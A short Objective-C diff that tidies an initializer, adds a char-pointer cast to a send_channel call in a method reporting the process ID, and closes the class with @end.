@@ -29,7 +29,7 @@
 @synthesize fileManager;
 
 -(id)init {
-    fileManager = [[NSFileManager alloc]  init];
+    fileManager = [[NSFileManager alloc] init];
     [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];
 
     return self;
@@ -38,5 +38,7 @@
 -(void)cmd_getpid {
     NSProcessInfo* processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    send_channel(channelPipe, [[NSString stringWithFormat:@"%sPID: %d\n", information, processID] UTF8String]);
+    send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sPID: %d\n", information, processID] UTF8String]);
 }
+
+@end
